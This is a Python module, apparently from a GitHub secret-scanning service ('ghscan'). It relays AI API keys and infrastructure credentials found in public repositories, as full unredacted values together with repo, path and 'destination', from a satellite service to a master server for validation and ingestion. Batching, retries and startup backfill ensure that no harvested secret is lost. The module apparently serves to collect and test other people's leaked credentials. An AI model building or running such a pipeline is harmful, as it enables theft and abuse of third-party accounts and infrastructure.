"""
Mirror-mode relay: ships finds from this satellite Railway service to the
master ghscan via HTTP. Master DB is the single source of truth — this
service keeps a local SQLite only for dedup + the unsynced buffer.

Flow:
  1. db.save_key() inserts the row locally as usual (so we don't re-process
     the same key next cycle), THEN calls enqueue_ai_find() if MIRROR_MODE=1.
  2. _flush_loop() background task POSTs accumulated finds every
     MIRROR_FLUSH_SEC to master's /admin/validate_keys endpoint.
  3. On HTTP failure, finds stay in the queue and are retried on next flush.
     The local DB row is the durable record — relay can re-enqueue from it
     on satellite restart via a one-shot backfill at startup.

Master-side dedup: /admin/validate_keys uses key_hash UNIQUE constraint, so
re-sending a find that's already on master is a no-op (returns "duplicate").
"""

from __future__ import annotations

import asyncio
import logging
from collections import deque
from typing import Optional

import httpx

from config import (
    MIRROR_MODE, MASTER_API_URL, MASTER_API_TOKEN,
    MIRROR_FLUSH_SEC, MIRROR_BATCH_MAX,
)

log = logging.getLogger(__name__)

# In-memory queue of unsynced AI-key finds. Each item is a dict matching
# /admin/validate_keys body schema.
_AI_QUEUE: deque[dict] = deque()
_INFRA_QUEUE: deque[dict] = deque()
_LOCK = asyncio.Lock()


def is_active() -> bool:
    """True when this process is in mirror mode AND properly configured."""
    return bool(MIRROR_MODE and MASTER_API_URL and MASTER_API_TOKEN)


def enqueue_ai_find(provider: str, key: str, repo: str,
                    file_path: str, file_url: str) -> None:
    """Queue an AI-key find for relay to master. Non-blocking."""
    if not is_active():
        return
    _AI_QUEUE.append({
        "provider": provider,
        "key":      key,
        "repo":     repo,
        "path":     file_path,
        "file_url": file_url,
    })


def enqueue_infra_find(cred_type: str, cred_full: str, repo: str,
                       file_path: str, file_url: str,
                       destination: str = "",
                       risk_level: str = "low") -> None:
    """Queue an infra-cred find for relay to master. Non-blocking."""
    if not is_active():
        return
    _INFRA_QUEUE.append({
        "cred_type":   cred_type,
        "cred":        cred_full,
        "repo":        repo,
        "path":        file_path,
        "file_url":    file_url,
        "destination": destination,
        "risk_level":  risk_level,
    })


async def _flush_ai(client: httpx.AsyncClient) -> int:
    """POST up to MIRROR_BATCH_MAX queued AI-key finds to master.
    Returns count actually accepted by master (saved or duplicate)."""
    if not _AI_QUEUE:
        return 0
    batch: list[dict] = []
    while _AI_QUEUE and len(batch) < MIRROR_BATCH_MAX:
        batch.append(_AI_QUEUE.popleft())

    if not batch:
        return 0

    try:
        r = await client.post(
            f"{MASTER_API_URL}/admin/validate_keys",
            headers={"Authorization": f"Bearer {MASTER_API_TOKEN}"},
            json={"source": "mirror", "items": batch},
            timeout=120,
        )
        if r.status_code != 200:
            log.warning("mirror: master rejected batch (%d): %s",
                        r.status_code, r.text[:200])
            # Re-enqueue at the front so we retry next flush
            for it in reversed(batch):
                _AI_QUEUE.appendleft(it)
            return 0
        body = r.json()
        return int(body.get("checked", 0))
    except Exception as e:
        log.warning("mirror: flush_ai POST failed (%s); requeueing %d items",
                    type(e).__name__, len(batch))
        for it in reversed(batch):
            _AI_QUEUE.appendleft(it)
        return 0


async def _flush_infra(client: httpx.AsyncClient) -> int:
    """POST up to MIRROR_BATCH_MAX queued infra finds to master.
    Master endpoint /admin/ingest_infra is added in main.py."""
    if not _INFRA_QUEUE:
        return 0
    batch: list[dict] = []
    while _INFRA_QUEUE and len(batch) < MIRROR_BATCH_MAX:
        batch.append(_INFRA_QUEUE.popleft())

    if not batch:
        return 0

    try:
        r = await client.post(
            f"{MASTER_API_URL}/admin/ingest_infra",
            headers={"Authorization": f"Bearer {MASTER_API_TOKEN}"},
            json={"source": "mirror", "items": batch},
            timeout=60,
        )
        if r.status_code != 200:
            log.warning("mirror: master rejected infra batch (%d): %s",
                        r.status_code, r.text[:200])
            for it in reversed(batch):
                _INFRA_QUEUE.appendleft(it)
            return 0
        body = r.json()
        return int(body.get("ingested", 0))
    except Exception as e:
        log.warning("mirror: flush_infra POST failed (%s); requeueing %d items",
                    type(e).__name__, len(batch))
        for it in reversed(batch):
            _INFRA_QUEUE.appendleft(it)
        return 0


async def _startup_backfill() -> None:
    """At mirror restart, in-memory _AI_QUEUE is empty but the local DB may
    contain finds that were inserted just before the kill — those would
    otherwise never reach master. Re-enqueue everything from the last
    BACKFILL_MINUTES so master can dedup-merge.

    Master's /admin/validate_keys uses key_hash UNIQUE; resending an already-
    known key returns "duplicate" and is harmless."""
    BACKFILL_MINUTES = 30
    try:
        import db
        from datetime import datetime, timezone, timedelta
        cutoff = (datetime.now(timezone.utc) - timedelta(minutes=BACKFILL_MINUTES)).strftime("%Y-%m-%dT%H:%M:%S")
        with db._conn() as c:
            ai_rows = c.execute(
                "SELECT provider, key_full, repo, file_path, file_url "
                "FROM found_keys WHERE discovered_at >= ?",
                (cutoff,),
            ).fetchall()
            infra_rows = c.execute(
                "SELECT cred_type, cred_full, repo, file_path, file_url, "
                "       destination, risk_level "
                "FROM infra_findings WHERE discovered_at >= ?",
                (cutoff,),
            ).fetchall()
        for r in ai_rows:
            _AI_QUEUE.append({
                "provider": r["provider"],
                "key":      r["key_full"],
                "repo":     r["repo"],
                "path":     r["file_path"],
                "file_url": r["file_url"],
            })
        for r in infra_rows:
            _INFRA_QUEUE.append({
                "cred_type":   r["cred_type"],
                "cred":        r["cred_full"],
                "repo":        r["repo"],
                "path":        r["file_path"],
                "file_url":    r["file_url"],
                "destination": r["destination"] or "",
                "risk_level":  r["risk_level"] or "low",
            })
        if ai_rows or infra_rows:
            log.info("mirror_relay startup: backfilled ai=%d infra=%d from last %dmin",
                     len(ai_rows), len(infra_rows), BACKFILL_MINUTES)
    except Exception as e:
        log.warning("mirror_relay startup backfill failed: %s", e)


async def flush_loop() -> None:
    """Background task — flush queues to master every MIRROR_FLUSH_SEC.
    Started by main.py only when is_active()."""
    if not is_active():
        log.info("mirror_relay: not active (MIRROR_MODE=%s, has_url=%s, has_token=%s)",
                 MIRROR_MODE, bool(MASTER_API_URL), bool(MASTER_API_TOKEN))
        return

    log.info("mirror_relay: started — flushing to %s every %.0fs",
             MASTER_API_URL, MIRROR_FLUSH_SEC)
    await _startup_backfill()
    async with httpx.AsyncClient() as client:
        while True:
            try:
                ai_n    = await _flush_ai(client)
                infra_n = await _flush_infra(client)
                if ai_n or infra_n:
                    log.info("mirror_relay: flushed ai=%d infra=%d (queue: ai=%d infra=%d)",
                             ai_n, infra_n, len(_AI_QUEUE), len(_INFRA_QUEUE))
            except Exception as e:
                log.error("mirror_relay flush_loop crashed: %s", e)
            await asyncio.sleep(MIRROR_FLUSH_SEC)


def queue_stats() -> dict:
    """For /health diagnostics on the mirror service."""
    return {
        "ai_queued":    len(_AI_QUEUE),
        "infra_queued": len(_INFRA_QUEUE),
        "active":       is_active(),
    }
